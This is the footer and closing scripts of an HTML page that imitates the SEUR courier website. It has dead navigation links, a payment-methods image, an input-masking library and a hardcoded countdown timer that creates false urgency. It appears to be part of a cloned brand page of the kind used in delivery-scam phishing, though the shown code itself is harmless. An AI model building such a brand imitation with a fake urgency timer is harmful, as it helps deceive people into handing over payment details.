                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Actualidad <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Fundación SEUR</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Blog SEUR</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Sala de prensa</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Envío internacional <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Seguimiento internacional</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Envíos a Europa</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Envíos a Estados Unidos</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Empresas <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Acceso a SEUR Pro</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Únete a la red SEUR Picku</li>
                           </ul>
                       </div>
                       <div class="col-lg-4 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active d-flex align-items-center justify-content-between">Descubre SEUR <img src="image/plus.svg" alt=""></li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">SEUR Internacional</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Fulfillment by SEUR</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">SEUR Mensajería</li>
                               <li class="nav-item"><img src="image/arrow.svg" alt="">Trabaja con nosotros</li>
                           </ul>
                       </div>
                   </div>
               </div>
               <div class="col-lg-3">
                   <div class="row">
                       <div class="col-12 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active">Encuéntranos:</li>
                               <li class="nav-item d-block"><img src="image/fb.png" alt="" class="img-fluid" style="filter: none;"></li>
                           </ul>
                       </div>
                       <div class="col-12 mt-4">
                           <ul class="nav d-block">
                               <li class="nav-item active">Métodos de pago:</li>
                               <li class="nav-item d-block"><img src="image/ps3.png" alt="" class="img-fluid" style="filter: none;"></li>
                           </ul>
                       </div>
                   </div>
               </div>
           </div>
       </div>
       <div class="container live d-flex align-items-center">
           <h6 class="d-flex align-items-center"><img src="image/lolo.svg" alt="" class="d-block d-lg-none" style=" filter: brightness(0) invert(1);margin-right: 15px;">Copyright © SEUR 2024</h6>
           <ul class="d-none d-lg-block">
               <li class="">Política de privacidad y cookies</li>
               <li class="">Configure cookies</li>
               <li class="">Aviso legal</li>
               <li class="">Uso fraudulento de la marca</li>
               <li class="">Condiciones de transporte</li>
           </ul>
           <img src="image/fot.png" alt="" class="img-fluid" width="120px">
       </div>
   </footer>













     


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    let hours = 28;
    let minutes = 42;
    let seconds = 45;

    const timer = document.getElementById("timer");

    function updateCountdown() {

      timer.innerHTML =
        String(hours).padStart(2, '0') + ":" +
        String(minutes).padStart(2, '0') + ":" +
        String(seconds).padStart(2, '0');

      if(hours === 0 && minutes === 0 && seconds === 0){
        clearInterval(countdown);
        timer.innerHTML = "Time's Up!";
        return;
      }

      seconds--;

      if(seconds < 0){
        seconds = 59;
        minutes--;

        if(minutes < 0){
          minutes = 59;
          hours--;
        }
      }
    }

    updateCountdown();

    const countdown = setInterval(updateCountdown, 1000);
  </script>
</body>
</html>